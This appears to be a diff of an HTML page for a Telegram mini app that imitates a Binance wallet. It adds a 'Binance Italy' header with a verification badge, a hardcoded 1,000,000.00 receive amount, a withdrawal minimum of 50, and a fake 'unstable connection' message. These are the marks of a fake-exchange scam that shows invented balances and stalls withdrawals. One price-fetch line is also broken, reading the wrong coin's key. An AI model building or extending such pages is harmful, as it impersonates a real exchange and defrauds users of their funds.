@@ -14,14 +14,23 @@
 
     tg.ready();
 
-    // Set header background color only
+    if (tg.isVersionAtLeast("8.0")) {
+      tg.requestFullscreen();
+    } else {
+      tg.expand();
+    }
+
     tg.setHeaderColor("#181A20");
   });
 </script>
  </head> 
+ 
+  
 <body>
+       <div class="top-bar-head">Binance Italy&nbsp<img src="https://cdn-icons-png.flaticon.com/128/7641/7641727.png" alt="BTC" class="top-bar-verif"></div>
+
   
-  
+    <main>
   
   <div class="card" hidden>    
   <h1>Wallet Balance</h1>
@@ -31,7 +40,7 @@
 </div>
   
   
-  
+
     <div id="login-container-one" class="login-container-one"> 
      <img src="https://www.amberdata.io/hs-fs/hubfs/Binance-Logo.wine.png?width=480&name=Binance-Logo.wine.png" alt="BTC" class="binance-icon">
      <div class=""></div>
@@ -120,7 +129,7 @@
   
   
   
-  <div id="home-page" class="home-page hidden">  
+  <div id="home-page" class="home-page hidden">   
     
     <!--<button id="logout-button">Log out</button>-->
   
@@ -148,15 +157,16 @@
     
     <div class="top-menu-buttons">
     <button id="deposit-button-top" class="modal-button-top">Deposit</button>
-    <button id="send-button-top" class="modal-button-top">Withdraw</button>
-    <button id="p2p-button" class="modal-button-top">P2P</button>
-<!--<button id="convert-butto" class="modal-button">Convert</button>--> 
+    <button id="send-button-top" class="modal-button-top">Withdraw</button> 
+    <button id="p2p-button" class="modal-button-top">P2P</button> 
+<!--<button id="convert-butto" class="modal-button">Convert</button>-->  
 
     </div>
      
     <div class="cryptos">
       <div class="h-font">Available Balances</div>
       <ul id="crypto-list"></ul>
+      <div class="int-con-error">Unstable internet connection. Please wait...</div>
     </div>
   </div> 
 
@@ -247,7 +257,7 @@ setInterval(fetchBNBPrice, 120000);
             try {
                 const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=wrapped-steth&vs_currencies=usd');
                 const data = await response.json();
-                const redETH = data['wrapped-steth'].usd;
+                const redETH = data['pax-gold'].usd;
                 document.getElementById('red-ETH').innerText = `$${redETH}`;
             } catch (error) {
                 document.getElementById('red-ETH').innerText = 'Loading...';
@@ -340,7 +350,7 @@ setInterval(fetchBNBPrice, 120000);
       </div>
        
       <div class="send-page-label-two">Withdrawal Amount</div>
-      <input type="number" id="amount" name="amount" min="0" step="0.01" placeholder="Minimum 0" required><br><br>
+      <input type="number" id="amount" name="amount" min="0" step="0.01" placeholder="Minimum 50" required><br><br>
       <!-- <button id="confirm-button" disabled class="disabled-button">Confirm</button> -->
        
     </form>  
@@ -353,12 +363,27 @@ setInterval(fetchBNBPrice, 120000);
       <div class="sans-left">* Do not transact with Sanctioned Entities. Learn more</div>
     <!--<a href="https://t.me/BinPolSupportbot" class="bolt">Click to submit withdrawal ticket</a>-->
      
-    <div class="sans-row"> 
+  <!--  <div class="sans-row"> 
       <div class="sans-column">       
         <div class="sans-spread">Receive amount</div> 
         <div class="sans-spread">0.00&nbsp<div id="modal-title-crypto-b">Crypto Name</div><span class="small-max">Max</span></div>
         <div class="sans-spread">Network fee 0.00&nbsp<div id="modal-title-crypto-c">Crypto Name</div></div> 
-      </div>  
+      </div> -->
+
+
+         <div class="sans-row">  
+      <div class="sans-column"> 
+        <div class="">Network fee</div>       
+        <div class="">Receive amount</div>  
+      </div> 
+      <div class="sans-column-b">
+        <div class="sans-span-x"><div class="sans-fee">--</div> &nbsp<div id="modal-title-crypto-c">Crypto Name</div></div> 
+        <div class="sans-span-x"><div class="sans-outcome">1,000,000.00</div> &nbsp<div id="modal-title-crypto-b">Crypto Name</div><span class="small-max">Max</span></div>
+      </div>
+    </div>
+
+      
+      
       <button id="sendpage-withdraw" class="sendpage-withdraw" disabled>Withdraw</button>
        
     </div> 
@@ -398,7 +423,7 @@ setInterval(fetchBNBPrice, 120000);
       </div>
        
       <div class="send-page-label-two">Withdrawal Amount</div>
-      <input type="number" id="amount" name="amount" min="0" step="0.01" placeholder="Minimum 0" required><br><br>
+      <input type="number" id="amount" name="amount" min="0" step="0.01" placeholder="Minimum 50" required><br><br>
       <!-- <button id="confirm-button" disabled class="disabled-button">Confirm</button> -->
        
     </form>  
@@ -410,12 +435,25 @@ setInterval(fetchBNBPrice, 120000);
     <div class="sans-left">* Do not withdraw directly to a crowdfund or ICO. We will not credit your account with tokens from that sale.</div>    
       <div class="sans-left">* Do not transact with Sanctioned Entities. Learn more</div>  
        
-    <div class="sans-row"> 
+    <!-- <div class="sans-row"> 
       <div class="sans-column">        
         <div class="">Receive amount</div>  
         <div class="">0.00 ETH</div>  
         <div class="">Network fee 0.00 ETH</div>  
+      </div> -->
+
+        <div class="sans-row">  
+      <div class="sans-column"> 
+        <div class="">Network fee</div>       
+        <div class="">Receive amount</div>  
       </div> 
+      <div class="sans-column-b">
+        <div class="sans-span-x"><div class="sans-fee">--</div> &nbsp<div id="modal-title-crypto-c">ETH</div></div> 
+        <div class="sans-span-x"><div class="sans-outcome">1,000,000.00</div> &nbsp<div id="modal-title-crypto-b">ETH</div><span class="small-max">Max</span></div>
+      </div>
+    </div>
+
+      
       <div id="sendpage-withdra" class="sendpage-withdraw">Withdraw</div>   
     </div>      
         
@@ -529,7 +567,7 @@ setInterval(fetchBNBPrice, 120000);
    
     <div class="express-container"> 
         
-        <main>
+        
            <!-- <div class="express-title">P2P Express</div>
             <div class="express-subtitle">Buy USDT with USD</div>
             <div class="express-description">Buy and Sell USDT on Binance P2P with various payment methods</div> -->
@@ -562,7 +600,7 @@ setInterval(fetchBNBPrice, 120000);
                 <button id="express-payment-preview" class="express-payment-preview" disabled>Preview</button> 
             </div>
           
-        </main>  
+          
     </div>
      
      </div>
@@ -644,6 +682,8 @@ setInterval(fetchBNBPrice, 120000);
 </ul>
          </div>
          </div>
+
+
   
 
   <!-- Modal for P2P transaction page -->
@@ -653,7 +693,7 @@ setInterval(fetchBNBPrice, 120000);
     <img src="https://www.amberdata.io/hs-fs/hubfs/Binance-Logo.wine.png?width=480&name=Binance-Logo.wine.png" alt="BTC" class="binance-icon-two">
       
       <div class="become-merchant-area">   
-        <div><img src="https://cdn-icons-png.flaticon.com/128/3602/3602342.png" alt="notifications" class="become-image"></div>
+        <div><img src="https://cdn-icons-png.flaticon.com/128/3602/3602342.png" alt="notifications" class="become-image"></div> 
       </div>  
       
         <nav>
@@ -696,6 +736,7 @@ setInterval(fetchBNBPrice, 120000);
         <div class="p2p-profile"><img src="https://cdn-icons-png.flaticon.com/128/456/456212.png" class="p2p-bottom-img"><div class="p2p-btm-txt">Profile</div></div>
       </div>
       
+    </div>
       
       
       <!-- Modal for P2P transaction page -->
@@ -1014,7 +1055,7 @@ window.onload = function () {
 };
 
                 </script>
-              </div>
+              </div> 
               
              <div id="order-switch-off">
               <div class="trader-info-box">
@@ -1111,7 +1152,6 @@ window.onload = function () {
       </div>
     </div>
   </div>-->
-       
         
         
         
@@ -1272,7 +1312,7 @@ setInterval(fetchPiPrice, 120000);
         <p>Payment Method</p>
         <div class="add-button-text">Select up to 5 payment methods</div>
         </div>
-        <div class="add-button-button">Add +</div>
+        <div class="add-button-button" id="add-button-button">Add +</div>
       </div>
   
           
@@ -1305,8 +1345,10 @@ setInterval(fetchPiPrice, 120000);
          
   </div>
    
-     
  </div>
+      </main>
+    
+    
     <script src="script.js"></script>
 </body>
   
